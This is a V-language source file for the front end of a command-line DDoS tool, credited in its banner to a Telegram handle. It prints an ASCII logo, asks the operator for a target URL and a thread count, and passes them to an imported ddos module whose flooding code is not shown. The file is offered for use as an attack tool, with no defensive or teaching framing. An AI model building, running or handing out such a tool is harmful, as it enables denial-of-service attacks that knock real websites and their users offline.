import ddos
import os
import term { erase_clear }

fn banner() {
	v_logo := '\033[34m'
	line := '\033[0m' 
	text := '\033[34m'
	reset := '\033[0m'

	erase_clear()
	println('${v_logo} ____    ____${line}')  
	println('${v_logo} \\   \\  /   /  ${line}|${text}      ____  ____       _____')
	println('${v_logo}  \\   \\/   /   ${line}|${text}     / __ \\/ __ \\____ / ___/')
	println('${v_logo}   \\      /    ${line}|${text}    / / / / / / / __ \\\\__ \\ ')
	println('${v_logo}    \\    /     ${line}|${text}   / /_/ / /_/ / /_/ /__/ / ')
	println('${v_logo}     \\__/      ${line}|${text}  /_____/_____/\\____/____/  ${reset}')
	println('${reset}       By https://t.me/${text}Parad0x2${reset}')
}

fn input(text string) string {
	print(text)
	return os.input('')
}

fn main() {
	input_text := '\033[34m'
	input_value := '\033[96m'
	reset := '\033[0m'

	banner()
	target_url := input('${reset}TARGET ${input_text}>> ${input_value}')
	total_threads := input('${reset}THREADS ${input_text}>>${input_value}').int()
	//print(reset)
	banner()

	ddos.ddos(total_threads, target_url)
}
